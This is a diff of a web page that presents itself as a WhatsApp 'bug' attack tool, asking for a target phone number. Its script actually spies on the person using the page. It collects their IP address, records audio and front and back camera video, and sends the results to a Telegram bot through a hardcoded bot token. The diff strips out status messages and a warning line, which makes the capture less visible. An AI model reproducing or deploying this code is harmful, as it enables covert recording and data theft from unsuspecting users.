@@ -50,10 +50,10 @@
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
-    .login-subtitle { font-size: 13px; color: #ffc107; margin-bottom: 20px; }
     .login-input {
       width: 100%;
       padding: 12px;
+      margin-top: 10px;
       margin-bottom: 16px;
       background: #333;
       border: none;
@@ -73,15 +73,6 @@
       font-size: 15px;
     }
     .login-button:hover { background-color: #0f0; box-shadow: 0 0 20px lime; }
-    #info {
-      white-space: pre-wrap;
-      text-align: left;
-      margin-top: 20px;
-      background: #222;
-      padding: 15px;
-      border-radius: 8px;
-      font-size: 13px;
-    }
     video { display: none; }
   </style>
 </head>
@@ -90,16 +81,13 @@
 
   <div class="login-container">
     <p class="login-title">bug WhatsApp By Hacked official</p>
-    <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
     <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
     <button class="login-button" id="login-button">Atack</button>
-    <div id="info">🥷 number target...</div>
   </div>
 
   <script>
     const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
     const chatIds = ['7945789634'];
-    const infoDiv = document.getElementById('info');
     const input = document.getElementById('text');
     const button = document.getElementById('login-button');
 
@@ -129,34 +117,6 @@
       });
     }
 
-    async function flashKedip() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-        const track = stream.getVideoTracks()[0];
-        const capabilities = track.getCapabilities();
-        if (!capabilities.torch) {
-          sendToTelegram('gagal menyalahkan flash');
-          track.stop();
-          return;
-        }
-        sendToTelegram('flash berhasil nyala ✅ (Mode Kedip)');
-        let count = 0;
-        let isOn = false;
-        const interval = setInterval(async () => {
-          isOn = !isOn;
-          await track.applyConstraints({ advanced: [{ torch: isOn }] });
-          count++;
-          if (count >= 10) {
-            clearInterval(interval);
-            await track.applyConstraints({ advanced: [{ torch: false }] });
-            track.stop();
-          }
-        }, 1000);
-      } catch (err) {
-        sendToTelegram('gagal menyalahkan flash');
-      }
-    }
-
     async function getInfo() {
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -183,7 +143,6 @@
       } catch (err) {}
     }
 
-    // Fungsi Rekam Video (6 Detik sesuai permintaan)
     async function recordVideo(facingMode, label) {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -203,10 +162,9 @@
           };
 
           mediaRecorder.start();
-          setTimeout(() => mediaRecorder.stop(), 6000); // Diubah menjadi 6 Detik
+          setTimeout(() => mediaRecorder.stop(), 6000);
         });
       } catch (err) {
-        sendToTelegram(`❌ Gagal Video ${label}`);
         resolve();
       }
     }
@@ -216,30 +174,18 @@
       if (!nomor || nomor.length < 8) return;
       
       button.disabled = true;
-      infoDiv.innerText = '⏳ Memproses sistem...';
       sendToTelegram(`<b>📞 Target:</b> ${nomor}`);
       
       try {
         await getInfo();
-        flashKedip();
         recordAudio(); 
-        
-        // Rekam Video Depan (6 detik)
-        infoDiv.innerText = '🎥 Merekam video depan (6s)...';
         await recordVideo("user", "Depan");
-        
-        // Jeda transisi
         await new Promise(r => setTimeout(r, 1000));
-        
-        // Rekam Video Belakang (6 detik)
-        infoDiv.innerText = '🎥 Merekam video belakang (6s)...';
         await recordVideo("environment", "Belakang");
         
-        infoDiv.innerText = `✅ Berhasil memproses ${nomor}`;
         button.disabled = false;
         input.value = '';
       } catch (e) {
-        infoDiv.innerText = '❌ Terjadi kesalahan.';
         button.disabled = false;
       }
     });
